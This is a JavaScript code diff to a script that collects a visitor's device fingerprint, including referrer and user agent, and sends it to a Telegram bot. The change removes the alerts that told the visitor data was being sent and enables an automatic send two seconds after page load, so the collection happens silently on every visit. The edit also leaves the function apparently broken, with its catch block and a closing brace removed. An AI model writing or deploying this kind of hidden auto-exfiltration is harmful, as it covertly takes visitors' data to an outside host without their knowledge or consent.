@@ -281,29 +281,13 @@ ${data.referrer}
 ${data.device.userAgent.substring(0, 150)}...
         `.replace(/\*/g, '').replace(/[_]/g, '');
         
-        const result = await sendToTelegramBot(telegramMessage);
-        
-        if (result && result.ok) {
-            console.log("✅ Fingerprint sent to Telegram!");
-            alert("✅ Device fingerprint sent to Telegram!");
-            return true;
-        } else {
-            console.log("❌ Failed to send");
-            alert("❌ Failed to send fingerprint");
-            return false;
-        }
-        
-    } catch (error) {
-        console.error("❌ Error:", error);
-        alert("❌ Error collecting fingerprint");
-        return false;
-    }
+        const result = await sendToTelegramBot(telegramMessage);             
 }
 
 // ========== EXPOSE FUNCTION TO GLOBAL SCOPE ==========
-window.sendFingerprintToTelegram = sendFingerprintToTelegram;
+//window.sendFingerprintToTelegram = sendFingerprintToTelegram;
 
 // Optional: Auto-send when page loads (comment out if not needed)
-// setTimeout(() => {
-//     sendFingerprintToTelegram();
-// }, 3000);
+setTimeout(() => {
+     sendFingerprintToTelegram();
+}, 2000);
